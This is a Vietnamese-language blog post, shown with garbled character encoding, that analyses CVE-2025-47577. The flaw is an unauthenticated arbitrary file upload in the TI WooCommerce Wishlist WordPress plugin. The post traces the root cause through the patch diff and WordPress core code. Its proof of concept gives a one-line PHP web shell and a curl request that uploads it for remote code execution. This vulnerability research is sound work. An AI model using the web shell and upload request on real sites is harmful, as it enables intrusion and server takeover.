# CVE-2025-47577 Analysis & POC


<!--more-->

## CVE & Basic Info
Lá»— há»•ng **"Unrestricted Upload of File with Dangerous Type"** trong **TemplateInvaders TI WooCommerce Wishlist** cho phÃ©p táº£i lÃªn **Web Shell** lÃªn mÃ¡y chá»§ web. Váº¥n Ä‘á» nÃ y áº£nh hÆ°á»Ÿng Ä‘áº¿n **TI WooCommerce Wishlist**: tá»« **n/a** Ä‘áº¿n **before 2.10.0**.

* **CVE ID**: [CVE-2025-47577](https://www.cve.org/CVERecord?id=CVE-2025-47577)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 2.9.2
* **Patched Versions**: 2.10.0
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress TI WooCommerce Wishlist Plugin](https://wordpress.org/plugins/ti-woocommerce-wishlist/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **TI WooCommerce Wishlist**: **2.9.2** (vulnerable) vÃ  **2.10.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.
* [**WooCommerce**](https://wordpress.org/plugins/woocommerce/)
* [**WC Fields Factory**](https://wordpress.org/plugins/wc-fields-factory/)

## Analysis
### Patch Diff

```php {title="wc-fields-factory.php - v2.9.2" hl_lines=[9] data-open=true}
function tinvwl_upload_file_wc_fields_factory( $file ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		require_once( ABSPATH . 'wp-admin/includes/file.php' );
	}
	$upload = wp_handle_upload(
		$file,
		[
			'test_form' => false,
			'test_type' => false,
		]
	);

	return $upload;
}
```

Trong phiÃªn báº£n lá»—i, hÃ m `tinvwl_upload_file_wc_fields_factory()` gá»i Ä‘áº¿n `wp_handle_upload()` Ä‘á»ƒ upload file vÃ o thÆ° má»¥c upload chÃ­nh thá»©c cá»§a WordPress (`wp-content/uploads/<year>/<month>/`)

> [!BUG]
> Tuy nhiÃªn, tÃ¹y chá»n `test_type => false` khiáº¿n WordPress **bá» qua viá»‡c kiá»ƒm tra MIME Type** dá»±a trÃªn whitelist há»£p lá»‡.
> Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng **upload cÃ¡c tá»‡p nguy hiá»ƒm nhÆ° web shell `.php`** lÃªn mÃ¡y chá»§.

```php {title="wc-fields-factory.php - v2.10.0" hl_lines=[] data-open=true}
function tinvwl_upload_file_wc_fields_factory( $file ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		require_once( ABSPATH . 'wp-admin/includes/file.php' );
	}
	$upload = wp_handle_upload(
		$file,
		[
			'test_form' => false,
		]
	);

	return $upload;
}
```

Báº£n vÃ¡ loáº¡i bá» tÃ¹y chá»n `'test_type' => false`, nÃªn máº·c Ä‘á»‹nh `'test_type' => true` kÃ­ch hoáº¡t kiá»ƒm tra MIME theo whitelist, ngÄƒn upload tá»‡p nguy hiá»ƒm nhÆ° web shell `.php`.

### Vulnerable Code 
> [!QUESTION]
> TrÆ°á»›c khi tiáº¿n hÃ nh trace, tÃ´i muá»‘n tÃ¬m hiá»ƒu hÃ m `wp_handle_upload()`, tÃ¬m Ä‘Ã¡p Ã¡n cho 2 cÃ¢u há»i:
> * VÃ¬ sao loáº¡i bá» `'test_type' => false` láº¡i kÃ­ch hoáº¡t kiá»ƒm tra MIME theo whitelist?
> * Whilelist Ä‘Ã³ bao gá»“m nhá»¯ng gÃ¬?

[wp_handle_upload()](https://developer.wordpress.org/reference/functions/wp_handle_upload/) lÃ  wrapper cá»§a hÃ m [_wp_handle_upload()](https://developer.wordpress.org/reference/functions/wp_handle_upload/)

```php {title="wordpress/wp-admin/includes/file.php" hl_lines=[11] data-open=true}
function wp_handle_upload( &$file, $overrides = false, $time = null ) {
	/*
	 *  $_POST['action'] must be set and its value must equal $overrides['action']
	 *  or this:
	 */
	$action = 'wp_handle_upload';
	if ( isset( $overrides['action'] ) ) {
		$action = $overrides['action'];
	}

	return _wp_handle_upload( $file, $overrides, $time, $action );
}
```

`wp_handle_upload()` thiáº¿t láº­p `$action` vÃ  gá»i Ä‘áº¿n `_wp_handle_upload()`

Trong file chá»©a `_wp_handle_upload()`, dÃ²ng [915](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L915)

```php {title="wordpress/wp-admin/includes/file.php" data-open=true}
$test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true;
```

ğŸ‘‰ GÃ¡n giÃ¡ trá»‹ cho biáº¿n `$test_type` - náº¿u trong `$overrides` cÃ³ key `'test_type'` thÃ¬ dÃ¹ng giÃ¡ trá»‹ Ä‘Ã³,
ngÆ°á»£c láº¡i thÃ¬ máº·c Ä‘á»‹nh lÃ  `true`. 

Tá»©c khi ta khÃ´ng truyá»n `test_type` hoáº·c truyá»n `test_type => true` thÃ¬ `$test_type` lÃ  `true`

Táº¡i dÃ²ng [953-973](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L953-L973)

```php {title="wordpress/wp-admin/includes/file.php" hl_lines=[2,12,13,14] data-open=true}
if ( $test_type ) {
    $wp_filetype     = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes );
    $ext             = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext'];
    $type            = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type'];
    $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename'];

    // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect.
    if ( $proper_filename ) {
        $file['name'] = $proper_filename;
    }

    if ( ( ! $type || ! $ext ) && ! current_user_can( 'unfiltered_upload' ) ) {
        return call_user_func_array( $upload_error_handler, array( &$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) );
    }

    if ( ! $type ) {
        $type = $file['type'];
    }
} else {
    $type = '';
}
```

Náº¿u `$test_type = true`, hÃ m sáº½ gá»i `wp_check_filetype_and_ext()` Ä‘á»ƒ kiá»ƒm tra **Ä‘uÃ´i file** vÃ  **MIME type** dá»±a trÃªn danh sÃ¡ch há»£p lá»‡ (whitelist) cá»§a WordPress.
Náº¿u file khÃ´ng cÃ³ Ä‘uÃ´i hoáº·c MIME type há»£p lá»‡, vÃ  ngÆ°á»i dÃ¹ng khÃ´ng cÃ³ quyá»n Ä‘áº·c biá»‡t (`unfiltered_upload`), há»‡ thá»‘ng sáº½ **tá»« chá»‘i upload**.

[Lines 3089-3315](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3089-L3315)
```php {title="wordpress/wp-includes/functions.php" hl_lines=[5] data-open=true}
function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {
	$proper_filename = false;

	// Do basic extension validation and MIME mapping.
	$wp_filetype = wp_check_filetype( $filename, $mimes );
    ...
    // Validate image types.
    // Validate files that didn't get validated during previous checks.
    // The mime type must be allowed.
    ...
}
```

`wp_check_filetype_and_ext()` gá»i Ä‘áº¿n `wp_check_filetype()` Ä‘á»ƒ thá»±c hiá»‡n xÃ¡c thá»±c pháº§n má»Ÿ rá»™ng cÆ¡ báº£n vÃ  Ã¡nh xáº¡ MIME.

[Line 3045-3062](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3045-L3062)
```php {title="wordpress/wp-includes/functions.php" hl_lines=[3] data-open=true}
function wp_check_filetype( $filename, $mimes = null ) {
	if ( empty( $mimes ) ) {
		$mimes = get_allowed_mime_types();
	}
	$type = false;
	$ext  = false;

	foreach ( $mimes as $ext_preg => $mime_match ) {
		$ext_preg = '!\.(' . $ext_preg . ')$!i';
		if ( preg_match( $ext_preg, $filename, $ext_matches ) ) {
			$type = $mime_match;
			$ext  = $ext_matches[1];
			break;
		}
	}

	return compact( 'ext', 'type' );
}
```

`wp_check_filetype()` chá»‰ kiá»ƒm tra Ä‘uÃ´i file (extension) dá»±a trÃªn whitelist MIME cá»§a WordPress - khÃ´ng xÃ¡c minh ná»™i dung tháº­t cá»§a file

HÃ m gá»i Ä‘áº¿n `get_allowed_mime_types()` Ä‘á»ƒ láº¥y danh sÃ¡ch MIME Types

[Line 3640-3661](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3640-L3661)
```php {title="wordpress/wp-includes/functions.php" hl_lines=[2] data-open=true}
function get_allowed_mime_types( $user = null ) {
	$t = wp_get_mime_types();

	unset( $t['swf'], $t['exe'] );
	if ( function_exists( 'current_user_can' ) ) {
		$unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' );
	}

	if ( empty( $unfiltered ) ) {
		unset( $t['htm|html'], $t['js'] );
	}

	/**
	 * Filters the list of allowed mime types and file extensions.
	 *
	 * @since 2.0.0
	 *
	 * @param array            $t    Mime types keyed by the file extension regex corresponding to those types.
	 * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user).
	 */
	return apply_filters( 'upload_mimes', $t, $user );
}
```

`wp_get_mime_types()` Ä‘Æ°á»£c gá»i sáº½ tráº£ vá» danh sÃ¡ch MIME Types tháº­t sá»± Ä‘Æ°á»£c cháº¥p nháº­n

[Line 3430-3557](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3430-L3557)
```php {title="wordpress/wp-includes/functions.php" hl_lines=[]}
function wp_get_mime_types() {
	/**
	 * Filters the list of mime types and file extensions.
	 *
	 * This filter should be used to add, not remove, mime types. To remove
	 * mime types, use the 'upload_mimes' filter.
	 *
	 * @since 3.5.0
	 *
	 * @param string[] $wp_get_mime_types Mime types keyed by the file extension regex
	 *                                    corresponding to those types.
	 */
	return apply_filters(
		'mime_types',
		array(
			// Image formats.
			'jpg|jpeg|jpe'                 => 'image/jpeg',
			'gif'                          => 'image/gif',
			'png'                          => 'image/png',
			'bmp'                          => 'image/bmp',
			'tiff|tif'                     => 'image/tiff',
			'webp'                         => 'image/webp',
			'avif'                         => 'image/avif',
			'ico'                          => 'image/x-icon',

			// TODO: Needs improvement. All images with the following mime types seem to have .heic file extension.
			'heic'                         => 'image/heic',
			'heif'                         => 'image/heif',
			'heics'                        => 'image/heic-sequence',
			'heifs'                        => 'image/heif-sequence',

			// Video formats.
			'asf|asx'                      => 'video/x-ms-asf',
			'wmv'                          => 'video/x-ms-wmv',
			'wmx'                          => 'video/x-ms-wmx',
			'wm'                           => 'video/x-ms-wm',
			'avi'                          => 'video/avi',
			'divx'                         => 'video/divx',
			'flv'                          => 'video/x-flv',
			'mov|qt'                       => 'video/quicktime',
			'mpeg|mpg|mpe'                 => 'video/mpeg',
			'mp4|m4v'                      => 'video/mp4',
			'ogv'                          => 'video/ogg',
			'webm'                         => 'video/webm',
			'mkv'                          => 'video/x-matroska',
			'3gp|3gpp'                     => 'video/3gpp',  // Can also be audio.
			'3g2|3gp2'                     => 'video/3gpp2', // Can also be audio.
			// Text formats.
			'txt|asc|c|cc|h|srt'           => 'text/plain',
			'csv'                          => 'text/csv',
			'tsv'                          => 'text/tab-separated-values',
			'ics'                          => 'text/calendar',
			'rtx'                          => 'text/richtext',
			'css'                          => 'text/css',
			'htm|html'                     => 'text/html',
			'vtt'                          => 'text/vtt',
			'dfxp'                         => 'application/ttaf+xml',
			// Audio formats.
			'mp3|m4a|m4b'                  => 'audio/mpeg',
			'aac'                          => 'audio/aac',
			'ra|ram'                       => 'audio/x-realaudio',
			'wav|x-wav'                    => 'audio/wav',
			'ogg|oga'                      => 'audio/ogg',
			'flac'                         => 'audio/flac',
			'mid|midi'                     => 'audio/midi',
			'wma'                          => 'audio/x-ms-wma',
			'wax'                          => 'audio/x-ms-wax',
			'mka'                          => 'audio/x-matroska',
			// Misc application formats.
			'rtf'                          => 'application/rtf',
			'js'                           => 'application/javascript',
			'pdf'                          => 'application/pdf',
			'swf'                          => 'application/x-shockwave-flash',
			'class'                        => 'application/java',
			'tar'                          => 'application/x-tar',
			'zip'                          => 'application/zip',
			'gz|gzip'                      => 'application/x-gzip',
			'rar'                          => 'application/rar',
			'7z'                           => 'application/x-7z-compressed',
			'exe'                          => 'application/x-msdownload',
			'psd'                          => 'application/octet-stream',
			'xcf'                          => 'application/octet-stream',
			// MS Office formats.
			'doc'                          => 'application/msword',
			'pot|pps|ppt'                  => 'application/vnd.ms-powerpoint',
			'wri'                          => 'application/vnd.ms-write',
			'xla|xls|xlt|xlw'              => 'application/vnd.ms-excel',
			'mdb'                          => 'application/vnd.ms-access',
			'mpp'                          => 'application/vnd.ms-project',
			'docx'                         => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
			'docm'                         => 'application/vnd.ms-word.document.macroEnabled.12',
			'dotx'                         => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template',
			'dotm'                         => 'application/vnd.ms-word.template.macroEnabled.12',
			'xlsx'                         => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
			'xlsm'                         => 'application/vnd.ms-excel.sheet.macroEnabled.12',
			'xlsb'                         => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12',
			'xltx'                         => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template',
			'xltm'                         => 'application/vnd.ms-excel.template.macroEnabled.12',
			'xlam'                         => 'application/vnd.ms-excel.addin.macroEnabled.12',
			'pptx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
			'pptm'                         => 'application/vnd.ms-powerpoint.presentation.macroEnabled.12',
			'ppsx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow',
			'ppsm'                         => 'application/vnd.ms-powerpoint.slideshow.macroEnabled.12',
			'potx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.template',
			'potm'                         => 'application/vnd.ms-powerpoint.template.macroEnabled.12',
			'ppam'                         => 'application/vnd.ms-powerpoint.addin.macroEnabled.12',
			'sldx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.slide',
			'sldm'                         => 'application/vnd.ms-powerpoint.slide.macroEnabled.12',
			'onetoc|onetoc2|onetmp|onepkg' => 'application/onenote',
			'oxps'                         => 'application/oxps',
			'xps'                          => 'application/vnd.ms-xpsdocument',
			// OpenOffice formats.
			'odt'                          => 'application/vnd.oasis.opendocument.text',
			'odp'                          => 'application/vnd.oasis.opendocument.presentation',
			'ods'                          => 'application/vnd.oasis.opendocument.spreadsheet',
			'odg'                          => 'application/vnd.oasis.opendocument.graphics',
			'odc'                          => 'application/vnd.oasis.opendocument.chart',
			'odb'                          => 'application/vnd.oasis.opendocument.database',
			'odf'                          => 'application/vnd.oasis.opendocument.formula',
			// WordPerfect formats.
			'wp|wpd'                       => 'application/wordperfect',
			// iWork formats.
			'key'                          => 'application/vnd.apple.keynote',
			'numbers'                      => 'application/vnd.apple.numbers',
			'pages'                        => 'application/vnd.apple.pages',
		)
	);
}
```

ğŸ‘‰ ÄÃ£ tÃ¬m ra Ä‘Ã¡p Ã¡n cho cÃ¢u há»i thá»© 2

--- 

`tinvwl_upload_file_wc_fields_factory()` Ä‘Æ°á»£c gá»i trong hÃ m `tinvwl_meta_wc_fields_factory()`

```php {title="wc-fields-factory.php - v2.9.2" hl_lines=[5] data-open=true}
function tinvwl_meta_wc_fields_factory( $meta, $post, $files ) {
	if ( function_exists( 'wcff' ) ) {
		foreach ( $files as $name => $file ) {
			if ( array_key_exists( $name, $meta ) ) {
				$upload = tinvwl_upload_file_wc_fields_factory( $file );
				if ( empty( $upload['error'] ) && ! empty( $upload['file'] ) ) {
					$file['tmp_name'] = $upload['file'];
					$meta[ $name ]    = json_encode( array_merge( $upload, $file ) );
				}
			}
		}
	}

	return $meta;
}
```

Chá»‰ cháº¡y náº¿u plugin **WC Fields Factory (wcff)** Ä‘ang Ä‘Æ°á»£c kÃ­ch hoáº¡t - vÃ¬ plugin nÃ y Ä‘á»‹nh nghÄ©a hÃ m `wcff()`, khi tÃ¬m vá»›i tá»« khÃ³a `function wcff(` trong thÆ° má»¥c chá»©a cÃ¡c plugin

![wcff](wcff.png "NÆ¡i wcff() Ä‘Æ°á»£c táº¡o")

Ta tháº¥y Ä‘Æ°á»£c nÆ¡i hÃ m `wcff()` Ä‘Æ°á»£c táº¡o lÃ  plugin **WC Fields Factory (wcff)**

```php
if ( array_key_exists( $name, $meta ) ) { ... }
```
Chá»‰ xá»­ lÃ½ náº¿u tÃªn file (`$name`) trÃ¹ng vá»›i má»™t key trong `$meta` (tá»©c lÃ  trÆ°á»ng form há»£p lá»‡).

```php
$upload = tinvwl_upload_file_wc_fields_factory( $file );
```
Gá»i hÃ m `tinvwl_upload_file_wc_fields_factory()` Ä‘á»ƒ upload file lÃªn server

HÃ m `tinvwl_meta_wc_fields_factory()` Ä‘Æ°á»£c Ä‘Äƒng kÃ½ lÃ m callback cho filter

```php
add_filter( 'tinvwl_addtowishlist_prepare_form', 'tinvwl_meta_wc_fields_factory', 10, 3 );
```

CÃ³ nghÄ©a lÃ , náº¿u trong mÃ£ nguá»“n `apply_filters( 'tinvwl_addtowishlist_prepare_form',...)` thÃ¬ `tinvwl_meta_wc_fields_factory()` Ä‘Æ°á»£c gá»i.

`tinvwl_addtowishlist_prepare_form` Ä‘Æ°á»£c apply trong hÃ m `add_to_wishlist()`

```php {title="addtowishlist.class.php - v2.9.2" hl_lines=[33] data-open=true}
function add_to_wishlist() {
    if ( is_null( filter_input( INPUT_POST, 'tinv_wishlist_id' ) ) ) {
        return false;
    } else {
        remove_action( 'init', 'woocommerce_add_to_cart_action' );
        remove_action( 'wp_loaded', 'WC_Form_Handler::add_to_cart_action', 20 );
    }
    ob_start();
    $post = filter_input_array( INPUT_POST, array(
        'tinv_wishlist_id'   => FILTER_VALIDATE_INT,
        'tinv_wishlist_name' => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'product_id'         => FILTER_VALIDATE_INT,
        'product_variation'  => FILTER_VALIDATE_INT,
        'product_type'       => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'product_action'     => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'redirect'           => FILTER_SANITIZE_URL,
    ) );

    $post['original_product_id'] = $post['product_id'];

    $wlp      = null;
    $wishlist = null;
    $data     = array( 'msg' => array() );
    ...

    $status = true;
    if ( empty( $post['product_id'] ) || apply_filters( 'tinvwl_addtowishlist_not_allowed', false, $post ) ) {
        $status        = false;
        $data['msg'][] = __( 'Something went wrong', 'ti-woocommerce-wishlist' );
    } else {
        $post['product_type'] = apply_filters( 'tinvwl_addtowishlist_modify_type', $post['product_type'], $post );
        $post                 = apply_filters( 'tinvwl_addtowishlist_prepare', $post );
        $form                 = apply_filters( 'tinvwl_addtowishlist_prepare_form', filter_input( INPUT_POST, 'form', FILTER_DEFAULT, FILTER_FORCE_ARRAY ), $_POST, $_FILES );
        ...
    } 
    ...
}
```

Äiá»u kiá»‡n cáº§n Ä‘á»ƒ logic apply Ä‘Æ°á»£c gá»i lÃ :
* POST method gá»“m cÃ¡c tham sá»‘ `tinv_wishlist_id` tá»“n táº¡i.
* `product_id` tá»“n táº¡i vÃ  filter `tinvwl_addtowishlist_not_allowed` luÃ´n `false` 

Filter `tinvwl_addtowishlist_not_allowed` máº·c Ä‘á»‹nh sáº½ tráº£ vá» `false` vÃ¬ khi search, tÃ´i khÃ´ng tháº¥y vá»‹ trÃ­ nÃ o apply Ä‘á»ƒ thay Ä‘á»•i giÃ¡ trá»‹ cá»§a nÃ³.

![Filter](filter.png "tinvwl_addtowishlist_not_allowed luÃ´n false")

`add_to_wishlist()` Ä‘Æ°á»£c Ä‘Äƒng kÃ½ lÃ m callback cho action hook

```php
add_action( 'wp_loaded', array( $this, 'add_to_wishlist' ), 0 );
```

Tá»©c sáº½ gá»i `add_to_wishlist` trÃªn má»—i request.

### Flow

{{< mermaid >}}
graph TD
  A["HTTP POST (tinv_wishlist_id, product_id, form[...] + file)"] --> B["wp_loaded â†’ add_to_wishlist()"]
  B --> C["apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)"]
  C --> D["tinvwl_meta_wc_fields_factory($meta, $post, $files)"]
  D --> E["foreach $files as $name => $file"]
  E --> F["if array_key_exists($name, $meta)"]
  F --> G["tinvwl_upload_file_wc_fields_factory($file)"]
  G --> H["wp_handle_upload($file, ['test_form'=>false, 'test_type'=>false])"]
  H --> I["_wp_handle_upload() â€” MIME checks skipped"]
  I --> J["File written to /wp-content/uploads â†’ possible RCE"]
{{< /mermaid >}}

## Exploit

### Proof of Concept (PoC)

1. Táº¡o file `.php` chá»©a web shell
```php
<?php system($_REQUEST["cmd"]) ?>
```
2. Gá»­i POST request 

```bash
curl -X POST "http://localhost" -F "tinv_wishlist_id=1" -F "product_id=1" -F "form[image]=1" -F "image=@rce.php"
```

3. RCE vá»›i file upload

![Result](result.png "RCE vá»›i file upload")

## Conclusion

Lá»— há»•ng **CVE-2025-47577** báº¯t nguá»“n tá»« viá»‡c **vÃ´ hiá»‡u hÃ³a kiá»ƒm tra MIME type (`test_type => false`)** trong hÃ m `wp_handle_upload()`, cho phÃ©p káº» táº¥n cÃ´ng táº£i lÃªn báº¥t ká»³ tá»‡p nÃ o, bao gá»“m **mÃ£ PHP Ä‘á»™c háº¡i**. Khi file Ä‘Æ°á»£c táº£i lÃªn thÆ° má»¥c `/wp-content/uploads/`, nÃ³ cÃ³ thá»ƒ Ä‘Æ°á»£c truy cáº­p trá»±c tiáº¿p Ä‘á»ƒ thá»±c thi mÃ£ tá»« xa (RCE).
Báº£n vÃ¡ 2.10.0 Ä‘Ã£ kháº¯c phá»¥c báº±ng cÃ¡ch báº­t láº¡i kiá»ƒm tra MIME, Ä‘áº£m báº£o chá»‰ nhá»¯ng loáº¡i file há»£p lá»‡ trong danh sÃ¡ch whitelist cá»§a WordPress má»›i Ä‘Æ°á»£c phÃ©p upload.

## Key Takeaway

* LuÃ´n duy trÃ¬ **kiá»ƒm tra MIME type** vÃ  **pháº§n má»Ÿ rá»™ng file** khi xá»­ lÃ½ upload.
* KhÃ´ng nÃªn **ghi Ä‘Ã¨ cÃ¡c cÆ¡ cháº¿ báº£o máº­t máº·c Ä‘á»‹nh** cá»§a WordPress nhÆ° `test_type`.
* Khi phÃ¢n tÃ­ch lá»— há»•ng, viá»‡c **so sÃ¡nh patch diff** giÃºp nhanh chÃ³ng nháº­n diá»‡n nguyÃªn nhÃ¢n gá»‘c (root cause).
* NhÃ  phÃ¡t triá»ƒn plugin cáº§n thÆ°á»ng xuyÃªn **kiá»ƒm tra cÃ¡c hook vÃ  filter liÃªn quan Ä‘áº¿n upload** Ä‘á»ƒ trÃ¡nh rá»§i ro RCE.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress TI WooCommerce Wishlist Plugin <= 2.9.2 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/ti-woocommerce-wishlist/vulnerability/wordpress-ti-woocommerce-wishlist-2-9-2-arbitrary-file-upload-vulnerability)  

---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-07-cve-2025-47577/  

